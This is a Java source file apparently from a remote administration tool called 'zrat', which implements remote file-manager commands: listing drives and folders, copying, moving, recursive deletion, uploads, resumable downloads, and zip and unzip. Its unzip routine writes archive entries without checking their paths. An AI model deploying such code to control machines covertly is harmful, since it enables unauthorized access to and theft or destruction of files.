package com.zrat.server.controller;

import static com.zrat.server.util.Utils.buildFilePath;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.nio.channels.FileChannel;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import com.zrat.transfer.model.RemoteFile;
import com.zrat.transfer.model.TransferDataStruct;
public class FileServiceImpl extends BaseService implements FileService {

	@Override
	public TransferDataStruct copyFile(String fileName, String targetPath) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_COPYFILE);
		FileChannel fileChannel = null;
		try {
			File f = new File(fileName);
			if (!f.exists()) {
				f.createNewFile();
			}
			fileChannel = new FileInputStream(f).getChannel();

			fileChannel.transferTo(0, fileChannel.size(), new FileOutputStream(
					buildFilePath(targetPath,f.getName())).getChannel());
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				fileChannel.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		dataStruct.setObject(getFiles(targetPath).getObject());
		return dataStruct;
	}

	@Override
	public TransferDataStruct createDic(String path,String fileName) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_CREATEDIRECTORY);
		File f = new File(buildFilePath(path,fileName));
		if (!f.exists()) {
			f.mkdir();
		}
		dataStruct.setObject(getFiles(path).getObject());
		return dataStruct;
	}

	@Override
	public TransferDataStruct createFile(String path,String fileName) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_CREATEFILE);
		File f = new File(buildFilePath(path,fileName));
		if (!f.exists()) {
			try {
				f.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		dataStruct.setObject(getFiles(path).getObject());
		return dataStruct;
	}

	@Override
	public TransferDataStruct cutFile(String fileName, String targetPath) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_CUTFILE);
		File file = new File(fileName);
		File newFile = new File(buildFilePath(targetPath,file.getName()));
		try {
			file.renameTo(newFile);
		} catch (Exception e) {
		}
		dataStruct.setObject(getFiles(targetPath).getObject());
		return dataStruct;
	}

	@Override
	public TransferDataStruct deleteFile(String path) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_DELETEFILE);
		File f = new File(path);
		if (f.exists() && f.isDirectory()) {
			if (f.listFiles().length == 0) {
				f.delete();
			} else {
				File delFile[] = f.listFiles();
				int i = f.listFiles().length;
				for (int j = 0; j < i; j++) {
					if (delFile[j].isDirectory()) {
						deleteFile(delFile[j].getAbsolutePath());
					}
					delFile[j].delete();
				}
			}
		} else {
			if (f.exists())
				f.delete();
		}
		dataStruct.setObject(getFiles(f.getParent()));
		return dataStruct;
	}

	@Override
	public RandomAccessFile download(String file,String size) {
		//dataStruct = new TransferDataStruct(FileService.COMMAND_DOWNLOAD);
		RandomAccessFile raf;
		try {
			raf = new RandomAccessFile(file, "r");
			raf.seek(Long.parseLong(size));
		} catch (FileNotFoundException fnfe) {
			return null;
		} catch (IOException e) {
			return null;
		}

		//Object[] obs = new Object[]{localFile,region};
		//dataStruct.setObject(region);
		return raf;
	}

	@Override
	public TransferDataStruct getFiles(String path) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_SHOWFILES);

		File f = new File(path);
		
		
		
		File[] fs = f.listFiles();

		List<RemoteFile> files = new ArrayList<RemoteFile>();
		RemoteFile file = null;
//		file = new RemoteFile();
//		File parentFile = null;
		if (f.getParentFile() != null){
			File parentFile = f.getParentFile();
			RemoteFile pfile = new RemoteFile();
			pfile.setPath(parentFile.getAbsolutePath());
			pfile.setName(parentFile.getName());
			pfile.setSize(parentFile.length());
			pfile.setFile(parentFile.isFile());
			pfile.setUpdated(parentFile.lastModified());
			
			
			file = new RemoteFile();
			file.setPath(f.getAbsolutePath());
			file.setName(f.getName());
			file.setSize(f.length());
			file.setFile(f.isFile());
			file.setUpdated(f.lastModified());
			file.setParent(pfile);
			
			files.add(file);
		}else{
			RemoteFile pfile = new RemoteFile();
			pfile.setName("...");
			
			file = new RemoteFile();
			file.setPath(f.getAbsolutePath());
			file.setName(f.getName());
			file.setSize(f.length());
			file.setFile(f.isFile());
			file.setUpdated(f.lastModified());
			file.setParent(pfile);
			
			files.add(file);
		}
//		
		
		if (fs != null) {
			for (File listFile : fs) {
				file = new RemoteFile();
				file.setPath(listFile.getAbsolutePath());
				file.setName(listFile.getName());
				file.setSize(listFile.length());
				file.setFile(listFile.isFile());
				file.setUpdated(listFile.lastModified());
				files.add(file);
			}
		}
		dataStruct.setObject(files);
		return dataStruct;
	}

	@Override
	public TransferDataStruct getRoots() {
		dataStruct = new TransferDataStruct(FileService.COMMAND_SHOWROOTS);
		List<RemoteFile> files = new ArrayList<RemoteFile>();
		RemoteFile file = null;
		for (File listFile : File.listRoots()) {
			file = new RemoteFile();
			file.setPath(listFile.getAbsolutePath());
			file.setName(listFile.getPath());
			file.setSize(listFile.length());
			file.setFile(listFile.isFile());
			file.setUpdated(listFile.lastModified());
			file.setParent(null);
			files.add(file);
		}
		
		RemoteFile pfile = new RemoteFile();
		pfile.setName("...");
		
		
		file = new RemoteFile();
		file.setFile(false);
		file.setName("...");
		file.setParent(pfile);
		files.add(0,file);
		dataStruct.setObject(files);
		return dataStruct;

	}

	@Override
	public void uploadFile(String path,String fileName,byte[] b) {
		uploadFile(buildFilePath(path,fileName), b);
		
	}
	
	public void uploadFile(String filePath,byte[] b){
		RandomAccessFile raf = null;
		try {
			raf = new RandomAccessFile(filePath, "rw");
			raf.seek(raf.length());
			raf.write(b);
		} catch (FileNotFoundException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (IOException e2) {
			e2.printStackTrace();
		}finally{
			try {
				raf.close();
			} catch (IOException e1) {
				e1.printStackTrace();
			}
		}
	}

	public void zip(ZipOutputStream out, File f,
			String base, boolean first) throws Exception {
		if (first) {
			if (f.isDirectory()) {
				out.putNextEntry(new ZipEntry("/"));
				base = base + f.getName();
				first = false;
			} else
				base = f.getName();
		}
		if (f.isDirectory()) {
			File[] fl = f.listFiles();
			base = base + "/";
			for (int i = 0; i < fl.length; i++) {
				zip(out, fl[i], base + fl[i].getName(), first);
			}
		} else {
			out.putNextEntry(new ZipEntry(base));
			FileInputStream in = new FileInputStream(f);
			int b;
			while ((b = in.read()) != -1) {
				out.write(b);
			}
			in.close();
		}
	}

	@SuppressWarnings("unchecked")
	public void unZipFileByOpache(ZipFile zipFile,
			String unZipRoot) throws Exception, IOException {
		Enumeration<ZipEntry> e = (Enumeration<ZipEntry>) zipFile.entries();
		ZipEntry zipEntry;
		while (e.hasMoreElements()) {
			zipEntry = e.nextElement();
			InputStream fis = zipFile.getInputStream(zipEntry);
			if (zipEntry.isDirectory()) {
			} else {
				File file = new File(unZipRoot + File.separator
						+ zipEntry.getName());
				File parentFile = file.getParentFile();
				parentFile.mkdirs();
				FileOutputStream fos = new FileOutputStream(file);
				byte[] b = new byte[1024];
				int len;
				while ((len = fis.read(b, 0, b.length)) != -1) {
					fos.write(b, 0, len);
				}
				fos.close();
				fis.close();
			}
		}
	}

	public TransferDataStruct unZipFile(String unZipFileName,String unZipPath) {

		try {
			ZipFile zipFile = new ZipFile(
					unZipFileName);
			unZipFileByOpache(zipFile, unZipPath);
		} catch (IOException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
		dataStruct = new TransferDataStruct(FileService.COMMAND_UNZIPFILE);
		File f = new File(unZipPath);
		dataStruct.setObject(getFiles(f.getAbsolutePath()).getObject());
		return dataStruct;
	}

	public TransferDataStruct zipFile(String inputFileName, String zipFileName) {

		ZipOutputStream out;
		try {
			out = new ZipOutputStream(
					new FileOutputStream(zipFileName));
			File inputFile = new File(inputFileName);
			zip(out, inputFile, "", true);
			out.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}

		dataStruct = new TransferDataStruct(FileService.COMMAND_ZIPFILE);
		File f = new File(zipFileName);
		dataStruct.setObject(getFiles(f.getParent()).getObject());
		return dataStruct;
	}

}
